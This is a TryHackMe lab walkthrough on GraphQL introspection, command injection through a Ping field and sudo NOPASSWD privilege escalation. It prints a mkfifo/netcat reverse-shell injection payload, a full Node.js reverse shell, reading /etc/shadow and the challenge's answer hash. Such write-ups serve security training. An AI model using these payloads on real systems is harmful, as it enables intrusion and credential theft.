# GraphQL — TryHackMe Walkthrough

> A room detailing GraphQL and how it can be used for exploitation.

<p align="center"><a href="https://tryhackme.com/room/graphql">

<p align="center">
  <a href="https://tryhackme.com/room/graphql"><img src="https://img.shields.io/badge/TryHackMe-GraphQL-red?style=flat&logo=tryhackme" /></a>
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange" />
  <img src="https://img.shields.io/badge/Platform-Linux-blue?logo=linux" />
  <img src="https://img.shields.io/badge/Focus-API%20Exploitation-yellow" />
  <img src="https://img.shields.io/badge/Focus-Command%20Injection-yellow" />
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | GraphQL fundamentals and query syntax |
| 2 | GraphQL schema, types, and resolver design |
| 3 | GraphQL introspection for API enumeration |
| 4 | GraphIQL versus blind API interaction with curl |
| 5 | Command injection through a GraphQL field |
| 6 | Linux privilege escalation via sudo NOPASSWD on a Node.js script |

## Learning Objectives

- Explain what GraphQL is and how it differs from a traditional REST API
- Write a basic GraphQL query against a defined type and field
- Use introspection queries (`__schema`, `__type`) to enumerate an undocumented GraphQL API
- Identify and exploit a command injection vulnerability inside a GraphQL field
- Escalate from a low-privileged shell to root by abusing a sudo NOPASSWD entry on a Node.js script

## Prerequisites

- Basic familiarity with JSON and REST API concepts
- A netcat listener available on the attacking machine for catching reverse shells
- Basic Linux command line familiarity for post-exploitation steps
- Optional: the Altair browser extension, if practicing GraphQL queries against a server without a bundled GraphIQL interface

---

## [Task 1] — Introduction

### Step 1 — Read the room introduction

**Approach:** This task is informational only. It sets expectations that the room assumes some programming familiarity, since GraphQL concepts are explained using code examples.

> **Note:** No technical action is required here. The room is establishing scope before moving into GraphQL concepts.

### Task 1.1 — Read the above

<details><summary>Reveal Answer</summary>
No answer needed.
</details>

---

## [Task 2] — What is GraphQL

### Step 2 — Understand GraphQL as a query layer for APIs

**Approach:** Before touching any tooling, it's worth understanding what GraphQL actually is. It is not a database or a database language. It is a query language for interacting with an API, sitting in the same conceptual space as REST, just with a different request and response model.

A REST request to fetch cereal nutrition data might look like this:

```
curl cereal.api -d "title='Lucky Charms'"
```

returning:

```json
{
    "sugar": "50000000g"
    "protein": "0g"
    ...
}
```

A GraphQL query for the same data looks like this:

```ruby
{
    Cereal(name: "Lucky Charms")
    {
        sugar
        protein
    }
}
```

<p align="center"><img src="https://i.imgur.com/bjg60rQ.png" /></p>

> **Note:** The key difference is that GraphQL lets the client specify exactly which fields it wants back, rather than the server deciding what to return. GraphQL is not inherently insecure, but because it accepts client-supplied input the same way any other API does, the same injection-style vulnerabilities that apply to REST APIs still apply here. What makes GraphQL distinct from an offensive security standpoint is covered in the next task.

### Task 2.1 — Read the above

<details><summary>Reveal Answer</summary>
No answer needed.
</details>

---

## [Task 3] — How GraphQL Works

### Step 3 — Examine the schema, type, and resolver structure

**Approach:** To use the information GraphQL exposes effectively, it helps to understand how a query is constructed from the developer's side. A GraphQL query follows this shape:

```ruby
{
    <type>  {
        field,
        field,
        ...
    }
}
```

Using the Cereal example from a NodeJS/Express implementation, the schema defines which types exist and what arguments they accept.

<p align="center"><img src="https://i.imgur.com/mY2wEae.png" /></p>

> **Note:** The schema is the root definition of everything a query is allowed to touch. The Query type acts as the entry point. In this example, the schema states that a Cereal object can be queried, that it accepts a name argument, and that it returns data of type Cereal. Anything not declared in the schema cannot be queried.

The corresponding query for this schema looks like this:

<p align="center"><img src="https://i.imgur.com/7IvqEYE.png" /></p>

Next, the Cereal type defines which fields can actually return data:

<p align="center"><img src="https://i.imgur.com/i3Z7PIe.png" /></p>

Querying those fields looks like this:

<p align="center"><img src="https://i.imgur.com/uoaRrov.png" /></p>

> **Note:** sugar and protein were declared as valid fields and both return data. The name field was left out of the query entirely and the request still succeeded, since GraphQL does not require every available field to be requested. A client can ask for as much or as little as it needs.

The data itself is defined in roughly the same shape as standard JSON:

<p align="center"><img src="https://i.imgur.com/Ur2I1um.png" /></p>

The resolver function does the actual work of matching the query input against the underlying data:

<p align="center"><img src="https://i.imgur.com/CsrVsKM.png" /></p>

> **Note:** This function takes the name supplied in the query, searches the cereal array for a match, and returns it. A query of Cereal(name: "Cinnamon Toast Crunch") would return the matching object shown below, in the exact shape GraphQL expects for a response.

<p align="center"><img src="https://i.imgur.com/18FZ6XL.png" /></p>

Finally, the root variable ties the Cereal object to its resolver function:

<p align="center"><img src="https://i.imgur.com/TrUq4GO.png" /></p>

> **Note:** This tells GraphQL that whenever the Cereal object is queried, the getCereal function should be used to resolve it. Put together, all of these pieces allow the following query to succeed end to end.

<p align="center"><img src="https://i.imgur.com/ttPvDBe.png" /></p>

> **Note:** Walking through the full chain: the client queries the Cereal object with the input Cinnamon Toast Crunch, requests the sugar and protein fields, and the resolver function matches that name against the underlying array and returns just those two fields. Understanding this developer-side flow matters offensively because it explains why introspection, covered next, is able to expose so much about an API's internal structure.

### Task 3.1 — Given the object Dog, with a parameter of name, how would you query the weight for a Shiba Inu

<details><summary>Reveal Answer</summary>
{ Dog(name:"Shiba Inu") { weight }}
</details>

---

## [Task 4] — How to Extract Sensitive Information from GraphQL

### Step 4 — Use introspection to enumerate types

**Approach:** GraphQL effectively documents itself through introspection. This is a major advantage over a typical undocumented REST API, where parameters and endpoints often have to be guessed or fuzzed blindly. GraphQL exposes a built-in `__schema` object that can be queried to list every type defined on the server.

```ruby
{
    __schema {
        types {
            name
            description
        }
    }
}
```

<p align="center"><img src="https://i.imgur.com/7lifZSB.png" /></p>

> **Note:** This query asks GraphQL for the name and description of every type registered in the schema. Since the schema defines whatever types the developers created, this immediately surfaces application-specific types alongside the built-in GraphQL ones. A type like Cereal standing out among the standard scalar types is a strong signal of where to look next.

### Step 5 — Enumerate fields on a specific type

**Approach:** Once a type of interest is identified, the built-in `__type` object can be queried by name to list its fields.

```ruby
{
    __type(name: "Cereal") {
        fields {
            name
        }
    }
}
```

<p align="center"><img src="https://i.imgur.com/hHezcjc.png" /></p>

> **Note:** This returns every field name available on the Cereal type, without needing to guess. Compared to fuzzing parameters against an undocumented REST endpoint, this is a significant time saving and is one of the main reasons introspection is one of the first things to check when assessing a GraphQL endpoint. For a broader set of pre-built introspection and exploitation queries, the PayloadsAllTheThings GraphQL Injection repository is a useful reference: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection

### Task 4.1 — How would I get the name of every field for the type Linux

<details><summary>Reveal Answer</summary>
{ __type:(name: "Linux"){ fields { name } } }
</details>

---

## [Task 5] — A Note on GraphIQL

### Step 6 — Understand GraphIQL versus raw API access

**Approach:** The graphical interface used throughout this room is GraphIQL, a web UI bundled with the NodeJS GraphQL module. It only works against the server it is installed on. During a real assessment, GraphIQL may not be present at all, in which case queries need to be URL-encoded and sent manually via a POST request, the same way any other API would be tested with a tool like curl.

> **Note:** This matters because it changes the workflow during an actual engagement. Without GraphIQL's interactive interface, query construction and introspection have to be done blind, by hand-crafting POST requests. The Altair browser extension (https://altair.sirmuel.design/) is mentioned as an alternative client that can connect to external GraphQL servers, unlike GraphIQL which is tied to its own backend.

### Task 5.1 — Read the above

<details><summary>Reveal Answer</summary>
No answer needed.
</details>

---

## [Task 6] — Challenge

### Step 7 — Enumerate the schema on the blank GraphIQL instance

**Approach:** This task provides no information up front beyond a blank GraphIQL interface. The starting point is the same `__schema` introspection query used earlier, run against this new target to see what types exist.

```ruby
{ __schema {types {name description } } }
```

```json
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "Query",
          "description": null
        },
        {
          "name": "String",
          "description": "The `String` scalar type represents textual data, represented as UTF-8 character sequences. The String type is most often used by GraphQL to represent free-form human-readable text."
        },
        {
          "name": "Ping",
          "description": null
        },
        {
          "name": "Boolean",
          "description": "The `Boolean` scalar type represents `true` or `false`."
        },
        {
          "name": "__Schema",
          "description": "A GraphQL Schema defines the capabilities of a GraphQL server. It exposes all available types and directives on the server, as well as the entry points for query, mutation, and subscription operations."
        },
        {
          "name": "__Type",
          "description": "The fundamental unit of any GraphQL Schema is the type. There are many kinds of types in GraphQL as represented by the `__TypeKind` enum.\n\nDepending on the kind of a type, certain fields describe information about that type. Scalar types provide no information beyond a name, description and optional `specifiedByUrl`, while Enum types provide their values. Object and Interface types provide the fields they describe. Abstract types, Union and Interface, provide the Object types possible at runtime. List and NonNull types compose other types."
        },
        {
          "name": "__TypeKind",
          "description": "An enum describing what kind of type a given `__Type` is."
        },
        {
          "name": "__Field",
          "description": "Object and Interface types are described by a list of Fields, each of which has a name, potentially a list of arguments, and a return type."
        },
        {
          "name": "__InputValue",
          "description": "Arguments provided to Fields or Directives and the input fields of an InputObject are represented as Input Values which describe their type and optionally a default value."
        },
        {
          "name": "__EnumValue",
          "description": "One possible value for a given Enum. Enum values are unique values, not a placeholder for a string or numeric value. However an Enum value is returned in a JSON response as a string."
        },
        {
          "name": "__Directive",
          "description": "A Directive provides a way to describe alternate runtime execution and type validation behavior in a GraphQL document.\n\nIn some cases, you need to provide options to alter GraphQL's execution behavior in ways field arguments will not suffice, such as conditionally including or skipping a field. Directives provide this by describing additional information to the executor."
        },
        {
          "name": "__DirectiveLocation",
          "description": "A Directive can be adjacent to many parts of the GraphQL language, a __DirectiveLocation describes one such possible adjacencies."
        }
      ]
    }
  }
}
```

> **Note:** Among the standard GraphQL introspection types, one application-specific type stands out: Ping. This is the natural next target, since a type named Ping strongly suggests it performs some kind of network operation server-side, which is exactly the sort of functionality worth probing for command injection. The raw notes for this room do not include the follow-up `__type(name: "Ping")` query that would normally confirm its arguments before exploitation; the field name `ip` used in the next step is inferred from the working payload itself rather than from a documented introspection result. If you are reproducing this walkthrough, running that introspection query first is good practice and was likely performed during the original session even though it was not captured in the notes.

### Step 8 — Exploit command injection in the Ping field

**Approach:** With a type called Ping accepting what appears to be an `ip` argument, the next step is to test whether that argument is passed unsanitized into a shell command on the server. A classic command injection payload is appended after a semicolon, using a named pipe to set up a reverse shell back to the attacking machine.

```ruby
{ Ping(ip: "; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 9001 >/tmp/f") { ip output } }
```

> **Note:** This payload closes out whatever legitimate ping command the server was constructing, then chains a separate set of commands using a semicolon. It removes any stale named pipe at /tmp/f, creates a fresh one, and pipes it through /bin/sh so that both input and output flow over a netcat connection back to YOUR_IP on port 9001. If the Ping field is passing the ip argument straight into a shell call without sanitization, this returns an interactive shell on the listener.

### Step 9 — Enumerate sudo privileges on the compromised host

**Approach:** With a foothold as the user para, the next move in any Linux post-exploitation workflow is to check what that user is permitted to run with elevated privileges.

```
para@ubuntu:~$ sudo -l
Matching Defaults entries for para on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User para may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /usr/bin/node /home/para/server.js
```

> **Note:** This is the privilege escalation path. para can run a specific Node.js script, /home/para/server.js, as root, without a password. Since para likely has write access to a file in their own home directory, this is a strong candidate for a sudo NOPASSWD privilege escalation: if the script's contents can be modified, whatever code is written into it will execute as root the next time it is invoked through sudo.

### Step 10 — Replace server.js with a reverse shell payload

**Approach:** Before modifying the script, the original is backed up. Then the file is rewritten with a NodeJS reverse shell payload (the "Celestial" reverse shell), targeting a second listener port to keep it distinct from the first shell.

```js
var net = require('net');
var spawn = require('child_process').spawn;
HOST="YOUR_IP";
PORT="9002";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }                                      
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
```

A decoded reference copy of this payload is available here: https://gist.github.com/mitchmoser/f6df9b7de4e6785ed66fd86082d02d69#file-celestial-reverse-shell-decoded

```
para@ubuntu:~$ cp server.js server.js.old
para@ubuntu:~$ rm -r server.js
para@ubuntu:~$ nano server.js
para@ubuntu:~$ sudo /usr/bin/node /home/para/server.js
```

> **Note:** server.js.old preserves the original file in case it needs to be restored. The script is then deleted and rewritten from scratch in nano with the reverse shell payload shown above, connecting back to YOUR_IP on port 9002 this time, separate from the first shell's port 9001. Running it with sudo /usr/bin/node /home/para/server.js executes the new file as root because of the NOPASSWD sudo rule identified earlier, handing over a root-owned connection on the second listener.

### Step 11 — Catch the root shell and read /etc/shadow

**Approach:** With the listener already running on port 9002, the modified server.js is executed via sudo, and the resulting connection is checked for root privileges before reading the shadow file for para's password hash.

```
kali@kali:~/CTFs/tryhackme/GraphQL$ nc -lnvp 9002
Listening on 0.0.0.0 9002
Connection received on Machine_IP 40028
Connected!
id
uid=0(root) gid=0(root) groups=0(root)
cat /etc/shadow | grep para
para:$1$CHyLRSmg$QAvdWTC70dsIHuM5KmTf20:18535:0:99999:7:::
```

> **Note:** The id command confirms the shell is running as uid 0, root, validating that the sudo NOPASSWD path worked as expected. From here, /etc/shadow is readable, and grep is used to isolate para's line, which contains the user's password hash. This hash uses the $1$ prefix, which identifies it as MD5crypt, and could be cracked offline with a tool like John the Ripper or Hashcat if needed.

### Task 6.1 — What is the hash of the user para

<details><summary>Reveal Answer</summary>
$1$CHyLRSmg$QAvdWTC70dsIHuM5KmTf20
</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Read room introduction | Established room scope and assumed background knowledge |
| 2 | Reviewed GraphQL fundamentals versus REST | Understood GraphQL as a client-driven query language |
| 3 | Reviewed schema, type, and resolver structure in a sample NodeJS implementation | Understood how a GraphQL query maps to server-side code |
| 4 | Ran __schema introspection query | Enumerated all types defined on the GraphQL server |
| 5 | Ran __type introspection query against a specific type | Enumerated all queryable fields on that type |
| 6 | Reviewed GraphIQL versus manual API interaction | Understood how to interact with GraphQL servers lacking a bundled GUI |
| 7 | Ran __schema introspection against the challenge target | Identified a custom Ping type as a point of interest |
| 8 | Sent a command injection payload through the Ping field | Obtained an initial shell as the user para |
| 9 | Ran sudo -l as para | Identified a NOPASSWD sudo rule allowing para to run a Node.js script as root |
| 10 | Overwrote server.js with a reverse shell payload | Prepared a root-privileged reverse shell to execute via sudo |
| 11 | Executed the modified script with sudo and caught the connection | Obtained a root shell and read the password hash for para from /etc/shadow |

---
